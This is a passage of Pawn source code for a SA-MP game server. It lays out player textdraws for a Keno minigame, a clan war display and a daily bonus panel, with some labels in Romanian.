	KenoTD[84] = CreatePlayerTextDraw(playerid, 356.907897, 283.807647, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[84], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[84], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[84], 1);
	PlayerTextDrawColor(playerid, KenoTD[84], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[84], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[84], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[84], 255);
	PlayerTextDrawFont(playerid, KenoTD[84], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[84], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[84], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[84], true);

	KenoTD[85] = CreatePlayerTextDraw(playerid, 384.409576, 283.807647, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[85], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[85], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[85], 1);
	PlayerTextDrawColor(playerid, KenoTD[85], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[85], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[85], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[85], 255);
	PlayerTextDrawFont(playerid, KenoTD[85], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[85], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[85], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[85], true);

	KenoTD[86] = CreatePlayerTextDraw(playerid, 412.111267, 283.807647, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[86], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[86], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[86], 1);
	PlayerTextDrawColor(playerid, KenoTD[86], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[86], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[86], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[86], 255);
	PlayerTextDrawFont(playerid, KenoTD[86], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[86], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[86], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[86], true);

	KenoTD[87] = CreatePlayerTextDraw(playerid, 438.312866, 283.807647, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[87], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[87], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[87], 1);
	PlayerTextDrawColor(playerid, KenoTD[87], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[87], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[87], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[87], 255);
	PlayerTextDrawFont(playerid, KenoTD[87], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[87], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[87], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[87], true);

	KenoTD[88] = CreatePlayerTextDraw(playerid, 463.814422, 283.807647, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[88], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[88], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[88], 1);
	PlayerTextDrawColor(playerid, KenoTD[88], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[88], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[88], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[88], 255);
	PlayerTextDrawFont(playerid, KenoTD[88], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[88], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[88], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[88], true);

	KenoTD[89] = CreatePlayerTextDraw(playerid, 226.000000, 165.325042, "1___2___3____4___5___6___7___8___9___10");
	PlayerTextDrawLetterSize(playerid, KenoTD[89], 0.411998, 1.000625);
	PlayerTextDrawAlignment(playerid, KenoTD[89], 1);
	PlayerTextDrawColor(playerid, KenoTD[89], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[89], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[89], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[89], 255);
	PlayerTextDrawFont(playerid, KenoTD[89], 3);
	PlayerTextDrawSetProportional(playerid, KenoTD[89], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[89], 0);

	KenoTD[90] = CreatePlayerTextDraw(playerid, 222.500000, 188.950042, "11__12__13__14__15__16__17__18__19_20");
	PlayerTextDrawLetterSize(playerid, KenoTD[90], 0.411998, 1.000625);
	PlayerTextDrawAlignment(playerid, KenoTD[90], 1);
	PlayerTextDrawColor(playerid, KenoTD[90], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[90], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[90], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[90], 255);
	PlayerTextDrawFont(playerid, KenoTD[90], 3);
	PlayerTextDrawSetProportional(playerid, KenoTD[90], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[90], 0);

	KenoTD[91] = CreatePlayerTextDraw(playerid, 225.500000, 209.512542, "21__22__23__24_25__26__27__28__29_30");
	PlayerTextDrawLetterSize(playerid, KenoTD[91], 0.411998, 1.000625);
	PlayerTextDrawAlignment(playerid, KenoTD[91], 1);
	PlayerTextDrawColor(playerid, KenoTD[91], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[91], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[91], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[91], 255);
	PlayerTextDrawFont(playerid, KenoTD[91], 3);
	PlayerTextDrawSetProportional(playerid, KenoTD[91], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[91], 0);

	KenoTD[92] = CreatePlayerTextDraw(playerid, 225.000000, 243.200042, "31__32__33__34_35__36__37__38__39_40");
	PlayerTextDrawLetterSize(playerid, KenoTD[92], 0.411998, 1.000625);
	PlayerTextDrawAlignment(playerid, KenoTD[92], 1);
	PlayerTextDrawColor(playerid, KenoTD[92], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[92], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[92], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[92], 255);
	PlayerTextDrawFont(playerid, KenoTD[92], 3);
	PlayerTextDrawSetProportional(playerid, KenoTD[92], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[92], 0);

	KenoTD[93] = CreatePlayerTextDraw(playerid, 226.000000, 266.387542, "41_42__43__44__45_46__47__48_49__50");
	PlayerTextDrawLetterSize(playerid, KenoTD[93], 0.411998, 1.000625);
	PlayerTextDrawAlignment(playerid, KenoTD[93], 1);
	PlayerTextDrawColor(playerid, KenoTD[93], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[93], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[93], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[93], 255);
	PlayerTextDrawFont(playerid, KenoTD[93], 3);
	PlayerTextDrawSetProportional(playerid, KenoTD[93], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[93], 0);

	KenoTD[94] = CreatePlayerTextDraw(playerid, 223.500000, 287.825042, "51__52__53__54__55__56_57__58__59__60");
	PlayerTextDrawLetterSize(playerid, KenoTD[94], 0.411998, 1.000625);
	PlayerTextDrawAlignment(playerid, KenoTD[94], 1);
	PlayerTextDrawColor(playerid, KenoTD[94], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[94], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[94], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[94], 255);
	PlayerTextDrawFont(playerid, KenoTD[94], 3);
	PlayerTextDrawSetProportional(playerid, KenoTD[94], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[94], 0);

	KenoTD[95] = CreatePlayerTextDraw(playerid, 515.075683, 186.800018, "1~n~5~n~9~n~20~n~25~n~40~n~29~n~34~n~27~n~2~n~3~n~21~n~28~n~49~n~57");
	PlayerTextDrawLetterSize(playerid, KenoTD[95], 0.307999, 0.952499);
	PlayerTextDrawAlignment(playerid, KenoTD[95], 2);
	PlayerTextDrawColor(playerid, KenoTD[95], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[95], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[95], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[95], 255);
	PlayerTextDrawFont(playerid, KenoTD[95], 3);
	PlayerTextDrawSetProportional(playerid, KenoTD[95], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[95], 0);

	KenoTD[96] = CreatePlayerTextDraw(playerid, 216.399780, 318.625000, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[96], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[96], 275.000000, 11.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[96], 1);
	PlayerTextDrawColor(playerid, KenoTD[96], -5963521);
	PlayerTextDrawSetShadow(playerid, KenoTD[96], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[96], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[96], 255);
	PlayerTextDrawFont(playerid, KenoTD[96], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[96], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[96], 0);

	KenoTD[97] = CreatePlayerTextDraw(playerid, 216.899780, 319.062500, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[97], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[97], 274.000000, 10.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[97], 1);
	PlayerTextDrawColor(playerid, KenoTD[97], 505290495);
	PlayerTextDrawSetShadow(playerid, KenoTD[97], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[97], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[97], 255);
	PlayerTextDrawFont(playerid, KenoTD[97], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[97], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[97], 0);

	KenoTD[98] = CreatePlayerTextDraw(playerid, 347.782409, 319.800018, "ai_pierdut");
	PlayerTextDrawLetterSize(playerid, KenoTD[98], 0.307999, 0.952499);
	PlayerTextDrawAlignment(playerid, KenoTD[98], 2);
	PlayerTextDrawColor(playerid, KenoTD[98], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[98], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[98], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[98], 255);
	PlayerTextDrawFont(playerid, KenoTD[98], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[98], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[98], 0);

	KenoTD[99] = CreatePlayerTextDraw(playerid, 136.399780, 318.625000, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[99], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[99], 79.000000, 26.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[99], 1);
	PlayerTextDrawColor(playerid, KenoTD[99], -5963521);
	PlayerTextDrawSetShadow(playerid, KenoTD[99], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[99], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[99], 255);
	PlayerTextDrawFont(playerid, KenoTD[99], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[99], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[99], 0);

	KenoTD[100] = CreatePlayerTextDraw(playerid, 136.899780, 319.062500, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[100], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[100], 78.000000, 25.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[100], 1);
	PlayerTextDrawColor(playerid, KenoTD[100], 505290495);
	PlayerTextDrawSetShadow(playerid, KenoTD[100], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[100], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[100], 255);
	PlayerTextDrawFont(playerid, KenoTD[100], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[100], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[100], 0);

	KenoTD[101] = CreatePlayerTextDraw(playerid, 173.782409, 318.899963, "BALANTA");
	PlayerTextDrawLetterSize(playerid, KenoTD[101], 0.223499, 0.584999);
	PlayerTextDrawAlignment(playerid, KenoTD[101], 2);
	PlayerTextDrawColor(playerid, KenoTD[101], -5963521);
	PlayerTextDrawSetShadow(playerid, KenoTD[101], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[101], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[101], 255);
	PlayerTextDrawFont(playerid, KenoTD[101], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[101], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[101], 0);

	KenoTD[102] = CreatePlayerTextDraw(playerid, 174.782409, 330.712463, "$1,000,000,000");
	PlayerTextDrawLetterSize(playerid, KenoTD[102], 0.234998, 0.409999);
	PlayerTextDrawAlignment(playerid, KenoTD[102], 2);
	PlayerTextDrawColor(playerid, KenoTD[102], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[102], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[102], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[102], 255);
	PlayerTextDrawFont(playerid, KenoTD[102], 1);
	PlayerTextDrawSetProportional(playerid, KenoTD[102], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[102], 0);

	KenoTD[103] = CreatePlayerTextDraw(playerid, 492.099792, 318.662475, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[103], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[103], 50.000000, 26.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[103], 1);
	PlayerTextDrawColor(playerid, KenoTD[103], -5963521);
	PlayerTextDrawSetShadow(playerid, KenoTD[103], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[103], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[103], 255);
	PlayerTextDrawFont(playerid, KenoTD[103], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[103], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[103], 0);

	KenoTD[104] = CreatePlayerTextDraw(playerid, 492.899780, 319.199981, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[104], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[104], 49.000000, 24.679992);
	PlayerTextDrawAlignment(playerid, KenoTD[104], 1);
	PlayerTextDrawColor(playerid, KenoTD[104], 505290495);
	PlayerTextDrawSetShadow(playerid, KenoTD[104], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[104], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[104], 255);
	PlayerTextDrawFont(playerid, KenoTD[104], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[104], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[104], 0);

	KenoTD[105] = CreatePlayerTextDraw(playerid, 517.282409, 325.899963, "$500,000");
	PlayerTextDrawLetterSize(playerid, KenoTD[105], 0.165498, 0.711875);
	PlayerTextDrawAlignment(playerid, KenoTD[105], 2);
	PlayerTextDrawColor(playerid, KenoTD[105], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[105], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[105], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[105], 255);
	PlayerTextDrawFont(playerid, KenoTD[105], 1);
	PlayerTextDrawSetProportional(playerid, KenoTD[105], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[105], 0);

	KenoTD[106] = CreatePlayerTextDraw(playerid, 517.282409, 337.274963, "PIERDUT");
	PlayerTextDrawLetterSize(playerid, KenoTD[106], 0.223499, 0.584999);
	PlayerTextDrawAlignment(playerid, KenoTD[106], 2);
	PlayerTextDrawColor(playerid, KenoTD[106], -5963521);
	PlayerTextDrawSetShadow(playerid, KenoTD[106], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[106], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[106], 255);
	PlayerTextDrawFont(playerid, KenoTD[106], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[106], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[106], 0);

	KenoTD[107] = CreatePlayerTextDraw(playerid, 301.282409, 335.962463, "<");
	PlayerTextDrawLetterSize(playerid, KenoTD[107], 0.324997, 0.729375);
	PlayerTextDrawTextSize(playerid, KenoTD[107], 20.0, 20.0);
	PlayerTextDrawAlignment(playerid, KenoTD[107], 2);
	PlayerTextDrawColor(playerid, KenoTD[107], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[107], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[107], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[107], 255);
	PlayerTextDrawFont(playerid, KenoTD[107], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[107], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[107], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[107], true);

	KenoTD[108] = CreatePlayerTextDraw(playerid, 385.089843, 335.862457, ">");
	PlayerTextDrawLetterSize(playerid, KenoTD[108], 0.324997, 0.729375);
	PlayerTextDrawTextSize(playerid, KenoTD[108], 20.0, 20.0);
	PlayerTextDrawAlignment(playerid, KenoTD[108], 2);
	PlayerTextDrawColor(playerid, KenoTD[108], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[108], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[108], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[108], 255);
	PlayerTextDrawFont(playerid, KenoTD[108], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[108], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[108], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[108], true);

	KenoTD[109] = CreatePlayerTextDraw(playerid, 342.782409, 336.162475, "$500,000");
	PlayerTextDrawLetterSize(playerid, KenoTD[109], 0.223499, 0.584999);
	PlayerTextDrawAlignment(playerid, KenoTD[109], 2);
	PlayerTextDrawColor(playerid, KenoTD[109], -5963521);
	PlayerTextDrawSetShadow(playerid, KenoTD[109], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[109], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[109], 255);
	PlayerTextDrawFont(playerid, KenoTD[109], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[109], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[109], 0);

	KenoTD[110] = CreatePlayerTextDraw(playerid, 451.589843, 334.987457, "Play");
	PlayerTextDrawLetterSize(playerid, KenoTD[110], 0.324997, 0.729375);
	PlayerTextDrawTextSize(playerid, KenoTD[110], 20.0, 20.0);
	PlayerTextDrawAlignment(playerid, KenoTD[110], 2);
	PlayerTextDrawColor(playerid, KenoTD[110], -1);
	PlayerTextDrawSetShadow(playerid, KenoTD[110], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[110], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[110], 255);
	PlayerTextDrawFont(playerid, KenoTD[110], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[110], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[110], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[110], true);

	KenoTD[111] = CreatePlayerTextDraw(playerid, 254.282409, 336.162475, "bile_selectate:_0");
	PlayerTextDrawLetterSize(playerid, KenoTD[111], 0.141497, 0.501874);
	PlayerTextDrawAlignment(playerid, KenoTD[111], 2);
	PlayerTextDrawColor(playerid, KenoTD[111], -5963521);
	PlayerTextDrawSetShadow(playerid, KenoTD[111], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[111], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[111], 255);
	PlayerTextDrawFont(playerid, KenoTD[111], 2);
	PlayerTextDrawSetProportional(playerid, KenoTD[111], 1);
	PlayerTextDrawSetShadow(playerid, KenoTD[111], 0);*/
	
	CWarTD[0] = CreatePlayerTextDraw(playerid, 495.000000, 146.687500, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, CWarTD[0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, CWarTD[0], 156.000000, 78.000000);
	PlayerTextDrawAlignment(playerid, CWarTD[0], 1);
	PlayerTextDrawColor(playerid, CWarTD[0], 336860415);
	PlayerTextDrawSetShadow(playerid, CWarTD[0], 0);
	PlayerTextDrawSetOutline(playerid, CWarTD[0], 0);
	PlayerTextDrawBackgroundColor(playerid, CWarTD[0], 255);
	PlayerTextDrawFont(playerid, CWarTD[0], 4);
	PlayerTextDrawSetProportional(playerid, CWarTD[0], 0);
	PlayerTextDrawSetShadow(playerid, CWarTD[0], 0);

	CWarTD[1] = CreatePlayerTextDraw(playerid, 628.500000, 147.562500, "Top~W~Zone CLAN WAR");
	PlayerTextDrawLetterSize(playerid, CWarTD[1], 0.256499, 1.376875);
	PlayerTextDrawAlignment(playerid, CWarTD[1], 3);
	PlayerTextDrawColor(playerid, CWarTD[1], 505318655);
	PlayerTextDrawSetShadow(playerid, CWarTD[1], 0);
	PlayerTextDrawSetOutline(playerid, CWarTD[1], 0);
	PlayerTextDrawBackgroundColor(playerid, CWarTD[1], 255);
	PlayerTextDrawFont(playerid, CWarTD[1], 2);
	PlayerTextDrawSetProportional(playerid, CWarTD[1], 1);
	PlayerTextDrawSetShadow(playerid, CWarTD[1], 0);

	CWarTD[2] = CreatePlayerTextDraw(playerid, 574.000000, 168.125000, "[A]_VS__[RW]");
	PlayerTextDrawLetterSize(playerid, CWarTD[2], 0.246499, 0.624375);
	PlayerTextDrawAlignment(playerid, CWarTD[2], 2);
	PlayerTextDrawColor(playerid, CWarTD[2], -1);
	PlayerTextDrawSetShadow(playerid, CWarTD[2], 0);
	PlayerTextDrawSetOutline(playerid, CWarTD[2], 0);
	PlayerTextDrawBackgroundColor(playerid, CWarTD[2], 255);
	PlayerTextDrawFont(playerid, CWarTD[2], 1);
	PlayerTextDrawSetProportional(playerid, CWarTD[2], 1);
	PlayerTextDrawSetShadow(playerid, CWarTD[2], 0);

	CWarTD[3] = CreatePlayerTextDraw(playerid, 573.500000, 179.062500, "[A]_CLAN_HP:_1000");
	PlayerTextDrawLetterSize(playerid, CWarTD[3], 0.196499, 0.873750);
	PlayerTextDrawAlignment(playerid, CWarTD[3], 2);
	PlayerTextDrawColor(playerid, CWarTD[3], -1);
	PlayerTextDrawSetShadow(playerid, CWarTD[3], 0);
	PlayerTextDrawSetOutline(playerid, CWarTD[3], 0);
	PlayerTextDrawBackgroundColor(playerid, CWarTD[3], 255);
	PlayerTextDrawFont(playerid, CWarTD[3], 1);
	PlayerTextDrawSetProportional(playerid, CWarTD[3], 1);
	PlayerTextDrawSetShadow(playerid, CWarTD[3], 0);

	CWarTD[4] = CreatePlayerTextDraw(playerid, 573.500000, 195.687500, "[RW]_CLAN_HP:_1000");
	PlayerTextDrawLetterSize(playerid, CWarTD[4], 0.197499, 0.738125);
	PlayerTextDrawAlignment(playerid, CWarTD[4], 2);
	PlayerTextDrawColor(playerid, CWarTD[4], -1);
	PlayerTextDrawSetShadow(playerid, CWarTD[4], 0);
	PlayerTextDrawSetOutline(playerid, CWarTD[4], 0);
	PlayerTextDrawBackgroundColor(playerid, CWarTD[4], 255);
	PlayerTextDrawFont(playerid, CWarTD[4], 1);
	PlayerTextDrawSetProportional(playerid, CWarTD[4], 1);
	PlayerTextDrawSetShadow(playerid, CWarTD[4], 0);

	CWarTD[5] = CreatePlayerTextDraw(playerid, 576.500000, 213.237396, "CLAN_WAR_TIME:_05:00");
	PlayerTextDrawLetterSize(playerid, CWarTD[5], 0.241499, 1.048750);
	PlayerTextDrawAlignment(playerid, CWarTD[5], 2);
	PlayerTextDrawColor(playerid, CWarTD[5], -1);
	PlayerTextDrawSetShadow(playerid, CWarTD[5], 0);
	PlayerTextDrawSetOutline(playerid, CWarTD[5], 0);
	PlayerTextDrawBackgroundColor(playerid, CWarTD[5], 255);
	PlayerTextDrawFont(playerid, CWarTD[5], 2);
	PlayerTextDrawSetProportional(playerid, CWarTD[5], 1);
	PlayerTextDrawSetShadow(playerid, CWarTD[5], 0);
	
	DailyTD[0] = CreatePlayerTextDraw(playerid, 130.000000, 114.750000, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DailyTD[0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[0], 416.000000, 234.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[0], 1);
	PlayerTextDrawColor(playerid, DailyTD[0], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[0], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[0], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[0], 255);
	PlayerTextDrawFont(playerid, DailyTD[0], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[0], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[0], 0);

	DailyTD[1] = CreatePlayerTextDraw(playerid, 145.000000, 139.687500, "LD_POOL:BALL");
	PlayerTextDrawLetterSize(playerid, DailyTD[1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[1], 104.000000, 69.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[1], 1);
	PlayerTextDrawColor(playerid, DailyTD[1], 976830719);
	PlayerTextDrawSetShadow(playerid, DailyTD[1], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[1], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[1], 255);
	PlayerTextDrawFont(playerid, DailyTD[1], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[1], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[1], 0);

	DailyTD[2] = CreatePlayerTextDraw(playerid, 152.500000, 146.362640, "LD_POOL:BALL");
	PlayerTextDrawLetterSize(playerid, DailyTD[2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[2], 89.000000, 56.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[2], 1);
	PlayerTextDrawColor(playerid, DailyTD[2], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[2], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[2], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[2], 255);
	PlayerTextDrawFont(playerid, DailyTD[2], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[2], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[2], 0);

	DailyTD[3] = CreatePlayerTextDraw(playerid, 150.400024, 171.050018, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[3], 92.000000, 16.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[3], 1);
	PlayerTextDrawColor(playerid, DailyTD[3], 976830719);
	PlayerTextDrawSetShadow(playerid, DailyTD[3], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[3], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[3], 255);
	PlayerTextDrawFont(playerid, DailyTD[3], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[3], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[3], 0);

	DailyTD[4] = CreatePlayerTextDraw(playerid, 157.000000, 171.625000, "Daily_Bonus");
	PlayerTextDrawLetterSize(playerid, DailyTD[4], 0.307500, 1.271875);
	PlayerTextDrawAlignment(playerid, DailyTD[4], 1);
	PlayerTextDrawColor(playerid, DailyTD[4], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[4], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[4], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[4], 255);
	PlayerTextDrawFont(playerid, DailyTD[4], 2);
	PlayerTextDrawSetProportional(playerid, DailyTD[4], 1);
	PlayerTextDrawSetShadow(playerid, DailyTD[4], 0);

	DailyTD[5] = CreatePlayerTextDraw(playerid, 195.399871, 156.750000, "BLUE");
	PlayerTextDrawLetterSize(playerid, DailyTD[5], 0.307500, 1.271875);
	PlayerTextDrawAlignment(playerid, DailyTD[5], 3);
	PlayerTextDrawColor(playerid, DailyTD[5], 1010601215);
	PlayerTextDrawSetShadow(playerid, DailyTD[5], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[5], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[5], 255);
	PlayerTextDrawFont(playerid, DailyTD[5], 2);
	PlayerTextDrawSetProportional(playerid, DailyTD[5], 1);
	PlayerTextDrawSetShadow(playerid, DailyTD[5], 0);

	DailyTD[6] = CreatePlayerTextDraw(playerid, 229.899963, 156.750000, "GAME");
	PlayerTextDrawLetterSize(playerid, DailyTD[6], 0.307500, 1.271875);
	PlayerTextDrawAlignment(playerid, DailyTD[6], 3);
